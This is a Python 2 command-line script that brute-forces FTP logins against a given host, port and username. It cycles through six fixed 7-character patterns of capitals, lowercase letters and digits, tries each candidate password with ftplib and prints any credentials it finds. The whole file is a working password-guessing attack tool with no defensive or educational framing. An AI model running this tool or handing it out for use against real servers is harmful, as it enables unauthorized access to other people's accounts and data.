#! /usr/bin/python
import sys
import argparse
import datetime
import ftplib
from ftplib import FTP

#This tuple contains the values for the ascii range of each group
#The top layer has 6 entries that cycles through all 6 permutations of the password format
#The second layer contains the ascii range for each digit in the password
#The third layer hold the actual range values for the character type.
#i.e. capitals letters are in the range 65-90, the +1 to each second val is for looping puposes
perm = (((65,91), (65,91), (97, 123), (97, 123), (97, 123), (48, 58), (48, 58)),\
               ((65,91), (65,91), (48, 58), (48, 58), (97, 123), (97, 123), (97, 123)),\
               ((97, 123), (97, 123), (97, 123), (65,91), (65,91), (48, 58), (48, 58)),\
               ((97, 123), (97, 123), (97, 123), (48, 58), (48, 58), (65,91), (65,91)),\
               ((48, 58), (48, 58), (97, 123), (97, 123), (97, 123), (65,91), (65,91)),\
               ((48, 58), (48, 58), (65,91), (65,91), (97, 123), (97, 123), (97, 123)))

#Attempting to login to the ftp server
def attempt_login(target, port, username, password):
    try:
        print 'Login Attempt - User: ', username, ' Pass: ',password
        ftp = FTP()
        ftp.connect(target, int(port))
        ftp.login(username, password)
        ftp.quit()
        print '[!!] Credentials Discovered'
        print '[!!] Username: ', username
        print '[!!] Password: ', password
        return True
    #If login is unsuccessful an exception will be thrown
    except:
        return False


def brute_force(target, username, port):
    #p changes the permutation of each group
    for p in range(0,6):
        #Each consecutive loop cycles through each ascii value at the specified digit
        for i in range(perm[p][0][0], perm[p][0][1]):
            for j in range(perm[p][1][0], perm[p][1][1]):
                for k in range(perm[p][2][0], perm[p][2][1]):
                    for l in range(perm[p][3][0], perm[p][3][1]):
                        for m in range(perm[p][4][0], perm[p][4][1]):
                            for n in range(perm[p][5][0], perm[p][5][1]):
                                for o in range(perm[p][6][0], perm[p][6][1]):
                                    #Construct the password based of loop counter values, which will be the specific ascii value for each digit
                                    passwd = chr(i) + chr(j) + chr(k) + chr(l) + chr(m) + chr(n) + chr(o)
                                    found = attempt_login(target, port, username, passwd)
                                    if found==True:
                                        return 
            
#Parsing Command Line arguments        
parser = argparse.ArgumentParser()
parser.add_argument("-t", "--target")
parser.add_argument("-u", "--username")
parser.add_argument("-p", "--port")
args = parser.parse_args()
target = args.target
username = args.username
port = args.port

#Start Time
scriptStart =  datetime.datetime.now()
print 'Beginning script execution: ', scriptStart
#Running Script
brute_force(target, username, port)
#Calculating End Time
scriptEnd =  datetime.datetime.now()
scriptTime = scriptEnd - scriptStart
print 'Script Complete: ', scriptEnd
print 'Script Runtime: ', scriptTime

sys.exit(0)



